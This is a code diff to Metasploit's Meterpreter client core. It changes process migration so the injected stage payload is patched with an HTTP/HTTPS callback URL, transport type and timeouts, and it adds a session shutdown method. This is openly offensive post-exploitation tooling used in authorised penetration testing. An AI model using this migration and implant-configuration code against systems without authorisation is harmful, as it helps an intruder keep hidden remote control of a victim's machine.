@@ -184,7 +184,7 @@ class ClientCore < Extension
 
 		# We cant migrate into a process that does not exist.
 		if( process == nil )
-			raise RuntimeError, "Cannot migrate into non existant process", caller
+			raise RuntimeError, "Cannot migrate into non existent process", caller
 		end
 
 		# We cant migrate into a process that we are unable to open
@@ -216,13 +216,42 @@ class ClientCore < Extension
 		migrate_stager = c.new()
 		migrate_stager.datastore['DLL'] = ::File.join( Msf::Config.install_root, "data", "meterpreter", "metsrv.#{binary_suffix}" )
 
-		payload = migrate_stager.stage_payload
+		blob = migrate_stager.stage_payload
+
+		if client.passive_service
+
+			# Replace the transport string first (TRANSPORT_SOCKET_SSL
+			i = blob.index("METERPRETER_TRANSPORT_SSL")
+			if i
+				str = client.ssl ? "METERPRETER_TRANSPORT_HTTPS\x00" : "METERPRETER_TRANSPORT_HTTP\x00"
+				blob[i, str.length] = str
+			end
+
+			conn_id = self.client.conn_id
+			i = blob.index("https://" + ("X" * 256))
+			if i
+				str = self.client.url
+				blob[i, str.length] = str
+			end
+
+			i = blob.index([0xb64be661].pack("V"))
+			if i
+				str = [ self.client.expiration ].pack("V")
+				blob[i, str.length] = str
+			end
+
+			i = blob.index([0xaf79257f].pack("V"))
+			if i
+				str = [ self.client.comm_timeout ].pack("V")
+				blob[i, str.length] = str
+			end
+		end
 
 		# Build the migration request
 		request = Packet.create_request( 'core_migrate' )
 		request.add_tlv( TLV_TYPE_MIGRATE_PID, pid )
-		request.add_tlv( TLV_TYPE_MIGRATE_LEN, payload.length )
-		request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, payload, false, client.capabilities[:zlib])
+		request.add_tlv( TLV_TYPE_MIGRATE_LEN, blob.length )
+		request.add_tlv( TLV_TYPE_MIGRATE_PAYLOAD, blob, false, client.capabilities[:zlib])
 		if( process['arch'] == ARCH_X86_64 )
 			request.add_tlv( TLV_TYPE_MIGRATE_ARCH, 2 ) # PROCESS_ARCH_X64
 		else
@@ -232,19 +261,28 @@ class ClientCore < Extension
 		# Send the migration request (bump up the timeout to 60 seconds)
 		response = client.send_request( request, 60 )
 
-		# Disable the socket request monitor
-		client.monitor_stop
+		if client.passive_service
+			# Sleep for 5 seconds to allow the full handoff, this prevents
+			# the original process from stealing our loadlib requests
+			::IO.select(nil, nil, nil, 5.0)
+		else
+			# Prevent new commands from being sent while we finish migrating
+			client.comm_mutex.synchronize do
+				# Disable the socket request monitor
+				client.monitor_stop
 
-		###
-		# Now communicating with the new process
-		###
+				###
+				# Now communicating with the new process
+				###
 
-		# Renegotiate SSL over this socket
-		client.swap_sock_ssl_to_plain()
-		client.swap_sock_plain_to_ssl()
+				# Renegotiate SSL over this socket
+				client.swap_sock_ssl_to_plain()
+				client.swap_sock_plain_to_ssl()
 
-		# Restart the socket monitor
-		client.monitor_socket
+				# Restart the socket monitor
+				client.monitor_socket
+			end
+		end
 
 		# Update the meterpreter platform/suffix for loading extensions as we may have changed target architecture
 		# sf: this is kinda hacky but it works. As ruby doesnt let you un-include a module this is the simplest solution I could think of.
@@ -266,6 +304,15 @@ class ClientCore < Extension
 		client.send_keepalives = keepalive
 
 		return true
+	end
+
+	#
+	# Shuts the session down
+	#
+	def shutdown
+		request  = Packet.create_request('core_shutdown')
+		response = self.client.send_packet_wait_response(request, 15)
+		true
 	end
 
 end
